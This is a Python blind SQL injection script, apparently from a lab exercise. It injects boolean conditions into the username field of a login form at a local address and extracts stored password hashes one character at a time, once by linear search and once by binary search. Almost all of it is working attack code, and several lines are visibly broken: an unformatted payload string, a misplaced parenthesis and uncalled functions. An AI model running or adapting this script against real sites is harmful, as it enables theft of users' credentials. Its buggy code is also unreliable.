### restricted query scenario
### 128 queries, 32 char MD5 hash, 16 options per char = 4 req per char

### binary search method
### minimum and maximum vals in charset - 0 & f
### compare unknown value with middle
### if less than middle, run comparison w new min/max (0,middle)
### if more, run comparison w new min/max on other side (middle,f)

### 0123456789abcdef        >7?       false
### 01234567        >3?       true
### 34567       >5?       true
### 567       >6?       false
### look for ex: >5 true >6 false ++> must be 6

import requests

total_queries = 0
charset = "0123456789abcdef"
target = "127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload): #identify injection vulnerablity
  global total_queries
  r = requests.post(target, data = {"username" : f"admin' and {payload}--", "password" : "password"})
  total_queries += 1
  return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"): #determine valid characters for hash
  payload = f"(select hex(substr(password,{offset+1},1)) from user where id = {user_id}) {operator} hex('{character}')"
  return injected_query(payload)

def invalid_user(user_id): #validate user id
  payload = f"(select id from user where id = {user_id}) >= 0"
  return injected_query(payload)

def password_length(user_id): #find pass length
  i = 0
  while True:
    payload = "(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
    if not injected_query(payload):
      return i
    i += 1

def extract_hash(charset, user_id, password_length): #find pass hash
  found = ""
  for i in range(0, password_length):
    for j in range(len(charset)):
      if boolean_query(i, user_id, charset[j]):
        found += charset[j]
        break
  return found

def extract_hash_bst(charset, user_id, password_length): #perform binary hash extraction
  found = ""
  for index in range(0, password_length):
    start = 0
    end = len(charset) - 1
    while start <= end:
      if end - start == 1: #if values are next to eachother!
        if start == 0 and boolean_query(index, user_id, charset[start]): #check to include or exclude zero
          found += charset[start]
        else:
          found += charset[start + 1]
        break
      else:
        middle = (start + end) // 2
        if boolean_query(index, user_id, charset[middle]):
          end = middle
        else:
          start = middle
  return found 

def total_queries_taken(): #display total queries for logging and debugging
  global total_queries
  print(f"\t\t[!] Total Queries: {total_queries}")
  total_queries = 0

while True: #main implementation
  try:
    user_id = input("Enter User ID to extract hash: ")
    if not invalid_user(user_id):
      user_password_length = password_length(user_id)
      print(f"\t[-] User: {user_id} Hash Length: {user_password_length}")
      total_queries_taken()
      print(f"\t[-] User: {user_id} Hash: {extract_hash(charset, int(user_id), user_password_length)}")
      total_queries_taken
      print(f"\t[-] User: {user_id} Hash: {extract_hash_bst(charset), user_id, user_password_length}")
      total_queries_taken # should be dramatically less
    else:
      print(f"\t[X] User {user_id} does not exist")
  except KeyboardInterrupt:
    break

